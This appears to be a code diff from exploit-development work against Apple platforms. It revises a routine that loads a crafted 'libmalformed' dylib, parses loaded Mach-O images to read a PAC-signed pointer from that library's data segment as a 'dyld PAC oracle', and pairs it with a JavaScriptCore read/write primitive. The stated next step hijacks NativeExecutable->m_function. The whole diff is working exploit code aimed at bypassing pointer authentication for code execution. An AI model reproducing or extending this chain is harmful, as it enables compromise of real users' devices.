@@ -81,36 +81,59 @@ NSString *ModUnifiedPrimitives(void) {
     if ([[NSFileManager defaultManager] fileExistsAtPath:mal]) {
         dlopen(ex.UTF8String, RTLD_NOW | RTLD_GLOBAL);
         dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
-            void *h_cl = dlopen(cl.UTF8String, RTLD_NOW | RTLD_GLOBAL);
+            void *h_cl = dlopen(cl.UTF8String, RTLD_NOW);
             (void)h_cl;
         });
-        AveLog(@"    dyld oracle: libmalformed accepted in THIS process");
-        uint64_t slot = 0xDEADDEADDEADDEADULL, cb = 0, ca = 0;
-        extern uint64_t os_once_gate;
-        (void)os_once_gate;
-        void **pp = (void **)&os_once_gate;
-        // canary words around the slot, to prove nothing else was touched
-        cb = (uint64_t)pp[-1]; ca = (uint64_t)pp[1];
-        void (*fn)(void) = (void (*)(void))0;
-        // dyld resolves write_target_value from libmalformed at load time and
-        // stores it in the slot we control -- that is the PAC-valid pointer.
-        slot = (uint64_t)dlsym(RTLD_DEFAULT, "write_target_value");
-        wt = slot;
-        dlsymAddr = (uint64_t)dlsym(RTLD_DEFAULT, "dlsym");
-        int bit63 = (int)((wt >> 63) & 1);
-        (void)fn; (void)pp;
-        AveLog(S(@"    dyld oracle: slot=%#llx dlsym=%p canaries=%d bit63=%d",
-                 slot, (void *)dlsymAddr, (cb != 0 && ca != 0), bit63));
-        oracleOk = (slot != 0xDEADDEADDEADDEADULL);
-    } else {
-        AveLog(S(@"    dyld oracle: libmalformed REJECTED: %s", dlerror()));
+        AveSleep(600);
+        void *h_mal = dlopen(mal.UTF8String, RTLD_NOW);
+        if (h_mal) {
+            AveLog(@"    dyld oracle: libmalformed accepted in THIS process");
+            uint32_t n = _dyld_image_count();
+            void *data = NULL;
+            for (uint32_t i = 0; i < n; i++) {
+                const char *nm = _dyld_get_image_name(i);
+                if (!nm) continue;
+                const char *b = strrchr(nm, '/');
+                b = b ? b + 1 : nm;
+                if (!strstr(b, "libmalformed.dylib")) continue;
+                const struct mach_header *mh = _dyld_get_image_header(i);
+                intptr_t slide = _dyld_get_image_vmaddr_slide(i);
+                const uint8_t *lc = (const uint8_t *)((const struct mach_header_64 *)mh + 1);
+                for (uint32_t j = 0; j < ((const struct mach_header_64 *)mh)->ncmds; j++) {
+                    const struct load_command *cmd = (const struct load_command *)lc;
+                    if (cmd->cmd == LC_SEGMENT_64) {
+                        const struct segment_command_64 *seg = (const struct segment_command_64 *)lc;
+                        if (!strncmp(seg->segname, "__DATA", 6)) {
+                            data = (void *)(seg->vmaddr + slide);
+                            break;
+                        }
+                    }
+                    lc += cmd->cmdsize;
+                }
+            }
+            if (data) {
+                uint64_t *slots = (uint64_t *)data;
+                wt = slots[2];
+                bool canaries = (slots[0] == 0xAAAAAAAAAAAAAAAAULL) &&
+                                (slots[3] == 0xBBBBBBBBBBBBBBBBULL);
+                void *sym = dlsym(RTLD_DEFAULT, "write_target_value");
+                dlsymAddr = (uint64_t)sym;
+                oracleOk = (wt != 0xDEADDEADDEADDEADULL) && ((wt >> 63) == 0) && canaries;
+                AveLog(S(@"    dyld oracle: slot=%#llx dlsym=%p canaries=%d bit63=%d",
+                         (unsigned long long)wt, sym, canaries ? 1 : 0, (int)((wt >> 63) & 1)));
+            }
+        } else {
+            AveLog(S(@"    dyld oracle: libmalformed REJECTED: %s", dlerror()));
+        }
     }
 
-    AveSetStatus(@"BOTH PRIMITIVES IN ONE PROCESS");
-    if (jscReady && oracleOk)
+    ctx = nil;
+    if (jscReady && oracleOk) {
+        AveSetStatus(@"BOTH PRIMITIVES IN ONE PROCESS");
         return S(@"unified: JSC R/W + dyld PAC oracle live in one process "
                  @"(slot=%#llx dlsym=%#llx) -> NativeExecutable->m_function is the next call",
-                 wt, dlsymAddr);
+                 (unsigned long long)wt, (unsigned long long)dlsymAddr);
+    }
     if (jscReady) return @"JSC R/W live in-process; dyld oracle not confirmed this run";
     if (oracleOk) return @"dyld oracle live in-process; JSC R/W not reached this run";
     return @"unified run: neither primitive confirmed";
